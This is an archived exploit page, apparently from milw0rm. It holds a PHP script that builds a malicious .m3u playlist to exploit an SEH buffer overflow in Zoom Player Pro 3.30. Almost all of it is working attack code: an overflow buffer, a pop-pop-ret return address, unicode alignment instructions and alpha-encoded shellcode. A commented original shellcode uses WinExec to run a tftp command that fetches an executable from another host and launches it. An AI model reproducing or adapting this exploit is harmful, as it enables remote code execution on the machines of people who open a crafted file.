<html><head><title>Zoom Player Pro v.3.30 .m3u File Buffer Overflow Exploit (seh)</title></head><pre>&lt;?php
/*
  Zoom Player Pro v.3.30 .m3u file buffer overflow exploit (seh)
  by Nine:Situations:Group::surfista

  seems the same of http://secunia.com/advisories/28214/
  bug found by Luigi Auriemma
  no full working exploit out, so I made my test version
/*
/*
//original shellcode, 27 bytes + command
//re-encode with
//alpha2 --unicode ecx &lt;sh.txt
$scode =
&quot;\xeb\x13\x5b\x31\xc0\x50\x31\xc0\x88\x43\x4a\x53&quot;.
&quot;\xbb\x0d\x25\x86\x7c&quot;. //WinExec, kernel32.dll XP SP3
&quot;\xff\xd3\x31\xc0\xe8\xe8\xff\xff\xff&quot;.
&quot;cmd /c tftp -i 192.168.0.1 GET s s.exe &amp;&amp; s &amp;&amp; &quot;.
&quot;\xff&quot;;
*/

$_scode=&quot;IAIAIAIAIAIAIAIAIAIAIAIAIAIA4444jXAQADAZABARALAYAIAQAIAQAIAhAAAZ1&quot;.
        &quot;AIAIAJ11AIAIABABABQI1AIQIAIQI111AIAJQYAZBABABABABkMAGB9u4JBhkMC1Kn&quot;.
        &quot;QWPnpNQGP3XPCPJaCEkJmo5TFsLYoHSNQUpiXgxyoKOKOosPmOtKpNOQSKp1d36rTp&quot;.
        &quot;pkpNMpimPNQp9nRlnnQP6lxNNlplnP1MPPGQ524O0RSO02SnN35rXPeKpLfKvKp43kpkvmVMPkOA&quot;;

$buff=&quot;\x23\x45\x58\x54\x4d\x33\x55\x0d\x0a\x68\x74\x74\x70\x3a\x2f\x2f&quot;.
      &quot;\x77\x77\x77&quot;.
       str_repeat(&quot;\x61&quot;,0xfe8).
       /* unicode preamble, alignment */
       &quot;\x6e&quot;.                      //add byte ptr [esi],ch, nop equivalent [*]
       &quot;\xd3\x45&quot;.                  //0x004500d3  unicode friendly pop - pop - ret, zplayer.exe
       &quot;\x6e&quot;.                      //*
       &quot;\x05\x7f\x4c&quot;.              //add eax,4c007f00h
       &quot;\x6e&quot;.                      //*
       &quot;\x2d\x59\x4c&quot;.              //sub eax,4c005900h
       &quot;\x6e&quot;.                      //*
       &quot;\x50&quot;.                      //push eax
       &quot;\x6e&quot;.                      //*
       &quot;\x59&quot;.                      //pop ecx
       str_repeat(&quot;\x6e\x90&quot;,0x7f). //nop
       &quot;\x6e&quot;.                      //*
       &quot;\x6a&quot;.                      //push 0, nop equivalent
       $_scode.
       str_repeat(&quot;\x90&quot;,0xbb8);
$_fp=@fopen(&quot;pwn.m3u&quot;,&quot;w+&quot;);
if (!$_fp) { die(&quot;[:(] Failed to create file...&quot;);}
fputs($_fp,$buff);
fclose($_fp);
print(&quot;[:)] Done!&quot;);
?&gt;

# milw0rm.com [2009-04-27]</pre></html>